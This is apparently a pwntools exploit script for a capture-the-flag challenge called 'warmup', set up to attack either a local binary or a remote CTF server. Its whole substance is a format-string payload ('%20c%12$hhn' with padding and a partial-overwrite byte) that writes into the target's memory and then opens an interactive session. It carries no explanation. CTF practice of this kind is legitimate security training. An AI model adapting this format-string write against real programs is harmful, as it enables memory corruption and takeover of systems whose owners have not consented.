from pwn import*
context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'
binary='./warmup.dms'
elf=ELF(binary)
debug=1
if debug:
    io=process(binary)
else:
    io = remote("warmup.ctf.defenit.kr",3333)
libc = ELF("./libc.so.6")
s       = lambda data               :io.send(data) 
sa      = lambda data1,data         :io.sendafter(data1, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda data1,data         :io.sendlineafter(data1, data)
r       = lambda numb=4096          :io.recv(numb)
ru      = lambda data1, drop=True  :io.recvuntil(data1, drop)

s('%20c%12$hhn'.ljust(0x40,'\x11')+'\x18')
io.interactive()